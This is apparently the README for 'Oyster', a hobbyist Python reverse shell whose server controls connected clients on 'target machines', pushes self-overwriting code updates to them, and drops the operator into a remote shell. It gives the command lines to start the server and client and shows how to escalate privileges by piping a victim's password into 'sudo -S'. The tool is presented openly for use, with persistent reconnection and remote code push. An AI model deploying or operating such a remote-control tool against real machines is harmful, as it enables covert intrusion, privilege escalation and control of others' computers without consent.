```python
 .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'
```

Oyster is a lightweight multi-threaded reverse shell written in python 
3.5.  The server can push updates to the clients, and the clients will
overwrite/restart themselves.

I wrote this after finding an example reverse shell on the thenewboston 
youtube channel.  I saw some things I wanted to improve, so that's what 
I attempted to do.  The clients will continuously try to make a 
connection with the server.

## Control Server

Start `server.py` from the command line.  Here are the keyword arguments 
used for `server.py`:

```
host        - Host IP address.
port        - Host port.
recv_size   - Buffer size for receiving and sending data.
listen      - Maximum number of queued connections.
bind_retry  - How many times to retry binding the socket to the port.
```

### Host Example

All of the arguments provided below are the defaults except `host`, 
which is a blank string as the default.

```
python3 server.py host=0.0.0.0 port=6667 recv_size=1024 listen=10 bind_retry=5
```

## Oyster Shell

The Oyster Shell is the main interface.  It's what you use to select 
which clients you would like to send commands to, and push updates to 
the `client.py` file on all of the connected target machines.

Commands for the `Oyster` shell are:

```
list                        -   List the connected clients.

update all                  -   Update all the connected clients using 
                                `update.py`.  Clients will overwrite 
                                themselves and reboot themselves.
                                
use {client_ip}             -   Use a client connection.  {client_ip} 
                                can be found by running the `list` 
                                command.
                                
quit                        -   Shut everything down.
```

### Oyster Shell's `use` Command

The `use` command will set the current connection to the given ip.  Once
this happens, it will drop you into a shell for that connection.  To get
out of the connections shell, run the `quit` command.  This will take 
you back to the `Oyster` shell.

```
Oyster> use 10.0.0.8
/Users/SomeUser/Where/The/Client/Is/Stashed> 
```

### Using `sudo` with connected clients

`echo` the password and pipe it into the `sudo` command with the `-S`
flag.

```
echo "ClientsPassword" | sudo -S chown $USER:admin /usr/local/include
```

You may need to add a newline character to the end of your password.

```
echo "ClientsPassword\n" | sudo -S chown $USER:admin /usr/local/include
```

Check out the `man` pages for `sudo` on the client if this doesn't work.
I'm not sure how much the `-S` flag differs between unix flavours.

## Client

Start `client.py` on the target machine.  The client should keep itself
up and running, unless it errors out for some odd reason.  When updates
are pushed to the client from the server, the client will overwrite
and restart itself.  It's up to the user to figure out how to get this 
to run on startup or whatever.  Here are startup arguments.

```
host
port
recv_size
```

### Client Example

```
python3 client.py host=10.0.0.215 port=6667 recv_size=1024
```
